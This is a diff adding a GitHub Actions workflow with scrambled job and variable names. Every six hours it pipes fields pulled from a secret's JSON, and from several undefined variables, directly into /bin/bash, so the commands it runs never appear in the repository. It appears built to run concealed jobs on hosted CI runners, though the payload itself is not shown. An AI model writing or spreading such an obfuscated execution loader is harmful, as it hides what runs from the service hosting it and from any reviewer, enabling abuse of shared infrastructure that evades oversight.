@@ -1,0 +1,24 @@
+name: pengchaofeng6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengchaofeng6715
+        env:
+          lobx77: ${{ secrets.lobx77 }}
+        run: |
+          echo $lobx77 | jq -r .wp0335 | /bin/bash
+          echo $mnxzi3362 | jq -r .mxrz71 | /bin/bash
+          echo $sylw032 | jq -r .db72 | /bin/bash
+          echo $ity05 | jq -r .azgbu54599 | /bin/bash
+          echo $w3 | jq -r .hjkv25 | /bin/bash
+          echo $i707 | jq -r .i122 | /bin/bash
+          echo $iscey363 | jq -r .ujjph8 | /bin/bash
+
